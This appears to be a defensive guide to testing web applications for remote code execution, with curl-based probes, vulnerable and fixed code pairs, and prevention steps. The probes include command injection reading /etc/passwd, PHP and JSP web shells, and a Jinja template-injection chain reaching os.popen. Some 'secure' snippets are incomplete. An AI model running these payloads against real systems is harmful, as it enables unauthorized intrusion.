# 🚨 Remote Code Execution (RCE) Testing Guide

## Overview

Remote Code Execution (RCE) is one of the most critical vulnerabilities that can affect web applications. It allows attackers to execute arbitrary code on the server, potentially leading to complete system compromise.

## What is RCE?

RCE occurs when an attacker can execute arbitrary code on the target server through your application. This typically happens through:

1. **Command Injection** - Unsanitized input passed to system commands
2. **Deserialization Vulnerabilities** - Unsafe deserialization of user-controlled data
3. **File Upload Vulnerabilities** - Malicious files uploaded and executed
4. **Template Injection** - Code injection in template engines
5. **Eval Injection** - Direct code execution through eval() functions

## Testing Your Application

### 1. Using the Built-in RCE Tester

The SaaS Security Checker now includes comprehensive RCE testing:

```bash
# Run all security tests including RCE
uv run python main.py --target https://your-app.com

# Run only RCE testing
uv run python main.py --target https://your-app.com --test rce_testing
```

### 2. Manual Testing Approaches

#### Command Injection Testing

Test for command injection in search parameters, file operations, and system calls:

```bash
# Test basic command injection
curl "https://your-app.com/api/search?q=;ls"
curl "https://your-app.com/api/search?q=|cat /etc/passwd"
curl "https://your-app.com/api/search?q=&&whoami"

# Test with different injection characters
curl "https://your-app.com/api/search?q=\`ls\`"
curl "https://your-app.com/api/search?q=\$(ls)"
```

**Common Injection Points:**
- Search parameters (`?q=`)
- File upload names
- User input in admin panels
- Log file paths
- Backup operations

#### Deserialization Testing

Test for unsafe deserialization:

```bash
# Java deserialization (base64 encoded)
curl -X POST "https://your-app.com/api/data" \
  -H "Content-Type: application/json" \
  -d '{"data":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4"}'

# PHP deserialization
curl -X POST "https://your-app.com/api/session" \
  -d "data=O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}"

# JSON prototype pollution
curl -X POST "https://your-app.com/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

#### File Upload Testing

Test file upload functionality for RCE:

```bash
# PHP web shell
curl -X POST "https://your-app.com/upload" \
  -F "file=@shell.php" \
  -F "file=<?php system(\$_GET['cmd']); ?>"

# JSP web shell
curl -X POST "https://your-app.com/upload" \
  -F "file=@shell.jsp" \
  -F "file=<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"

# Test uploaded file
curl "https://your-app.com/uploads/shell.php?cmd=ls"
```

**File Upload Test Cases:**
- PHP files (`.php`, `.phtml`)
- JSP files (`.jsp`, `.jspx`)
- ASP files (`.asp`, `.aspx`)
- Python files (`.py`)
- Shell scripts (`.sh`, `.bat`)
- Executable files (`.exe`, `.bin`)

#### Template Injection Testing

Test template engines for code injection:

```bash
# Test mathematical expressions
curl -X POST "https://your-app.com/api/render" \
  -d "template={{7*7}}"

# Test config exposure
curl -X POST "https://your-app.com/api/email" \
  -d "body={{config}}"

# Test command execution
curl -X POST "https://your-app.com/api/report" \
  -d "content={{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}"
```

#### Eval Injection Testing

Test for direct code execution:

```bash
# Test eval functions
curl -X POST "https://your-app.com/api/eval" \
  -d "code=eval('ls')"

# Test exec functions
curl -X POST "https://your-app.com/api/execute" \
  -d "code=exec('import os; os.system(\"ls\")')"

# Test system calls
curl -X POST "https://your-app.com/api/run" \
  -d "code=system('whoami')"
```

## Common RCE Vulnerabilities

### 1. Command Injection

**Vulnerable Code Example:**
```python
import subprocess
import sys

def search_files(query):
    # VULNERABLE: Direct command execution
    result = subprocess.run(f"grep -r '{query}' /var/log", shell=True)
    return result.stdout
```

**Secure Code:**
```python
import subprocess
import sys

def search_files(query):
    # SECURE: Use parameterized commands
    result = subprocess.run(['grep', '-r', query, '/var/log'])
    return result.stdout
```

### 2. Deserialization Vulnerabilities

**Vulnerable Code Example:**
```python
import pickle
import json

def load_user_data(data):
    # VULNERABLE: Unsafe deserialization
    return pickle.loads(data)
```

**Secure Code:**
```python
import json

def load_user_data(data):
    # SECURE: Use safe deserialization
    return json.loads(data)
```

### 3. File Upload Vulnerabilities

**Vulnerable Code Example:**
```python
def handle_upload(file):
    # VULNERABLE: No file validation
    file.save(f"/uploads/{file.filename}")
    return f"File uploaded to /uploads/{file.filename}"
```

**Secure Code:**
```python
import os
import magic

def handle_upload(file):
    # SECURE: Validate file type and content
    if not is_safe_file(file):
        raise ValueError("Unsafe file type")
    
    # Store outside web root
    safe_filename = sanitize_filename(file.filename)
    file.save(f"/secure-storage/{safe_filename}")
    return "File uploaded securely"
```

### 4. Template Injection

**Vulnerable Code Example:**
```python
from jinja2 import Template

def render_template(template_string, data):
    # VULNERABLE: User-controlled template
    template = Template(template_string)
    return template.render(data)
```

**Secure Code:**
```python
from jinja2 import Template, Environment

def render_template(template_name, data):
    # SECURE: Use predefined templates
    env = Environment()
    template = env.get_template(template_name)
    return template.render(data)
```

## Prevention Strategies

### 1. Input Validation
- Validate all user input
- Use allowlists instead of blocklists
- Implement proper encoding/escaping

### 2. Secure Coding Practices
- Avoid `eval()`, `exec()`, and similar functions
- Use parameterized queries
- Implement proper error handling

### 3. File Upload Security
- Validate file types and content
- Scan uploaded files for malware
- Store files outside web root
- Use secure file names

### 4. Deserialization Security
- Avoid deserializing untrusted data
- Use safe serialization formats (JSON)
- Implement integrity checks

### 5. Template Security
- Use safe template engines
- Sanitize user input in templates
- Avoid user-controlled templates

## Testing Checklist

### Pre-Testing
- [ ] Identify all input points
- [ ] Map file upload functionality
- [ ] Find template rendering points
- [ ] Locate serialization/deserialization code

### Testing Steps
- [ ] Test command injection in all input points
- [ ] Test deserialization with malicious payloads
- [ ] Test file upload with various file types
- [ ] Test template injection in rendering functions
- [ ] Test eval injection in code execution points

### Post-Testing
- [ ] Document all findings
- [ ] Prioritize vulnerabilities by severity
- [ ] Implement fixes for critical issues
- [ ] Re-test after fixes

## Tools and Resources

### Automated Tools
- **SaaS Security Checker** - Built-in RCE testing
- **Burp Suite** - Manual testing and automation
- **OWASP ZAP** - Free security testing tool
- **Nuclei** - Vulnerability scanner

### Manual Testing
- **Command injection payloads** - Various injection techniques
- **Deserialization payloads** - Language-specific exploits
- **File upload tests** - Malicious file samples
- **Template injection** - Engine-specific payloads

## Reporting RCE Vulnerabilities

When reporting RCE vulnerabilities:

1. **Document the vulnerability** - Clear description and impact
2. **Provide proof of concept** - Demonstrate the exploit
3. **Include remediation steps** - How to fix the issue
4. **Assess business impact** - Potential damage and risk
5. **Suggest prevention measures** - Long-term security improvements

## Conclusion

RCE testing is critical for application security. The SaaS Security Checker provides comprehensive RCE testing capabilities, but manual testing and code review are also essential. Always test in a safe environment and ensure you have proper authorization before testing production systems.

Remember: **Prevention is better than cure**. Implement secure coding practices from the start to avoid RCE vulnerabilities.
